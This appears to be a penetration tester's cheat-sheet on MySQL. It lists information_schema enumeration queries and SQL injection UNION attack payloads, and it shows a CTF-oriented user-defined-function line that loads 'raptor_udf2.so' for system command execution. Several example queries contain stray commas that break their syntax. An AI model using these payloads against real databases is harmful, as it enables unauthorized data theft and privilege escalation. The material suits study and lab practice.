# MySQL 
## Structure
```
information_schema              Metadata and all the databases and tables
information_schema.schemata     Databases
information_schema.tables       Tables
information_schema.columns      Columns
```

### Example commands
```sql
-- Databases
SELECT group_concat(schema_name), FROM information_schema.schemata;

-- Tables from DB
SELECT group_concat(table_name), FROM information_schema.tables WHERE table_schema='YOURDB';

-- Columns from table
SELECT group_concat(column_name),FROM information_schema.columns WHERE table_name='TABLENAME';

-- Get data
SELECT data,data, FROM database.table;
```

## Queries
### UNION
When an application is vulnerable to SQL injection and the results of the query are returned within the application’s responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.

#### Examples
```sql
-- If values are returned in order
SELECT a, b FROM table1 UNION SELECT c, d FROM table2

-- If more than one entry is returned but not all of the are in use
SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
```

#### References
- [https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)


## Functions
### User-Defined function
Basic example, the functions takes a given number as a parameter and returns that number.
```sql
CREATE FUNCTION sql_function(random_num integer) RETURNS integer random_num;
```

The following example was written for a HTB machine, it stores a malicious `.so` file.     
**[DEMO](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)**
```sql
CREATE FUNCTION do_system RETURNS integer soname 'raptor_udf2.so';
```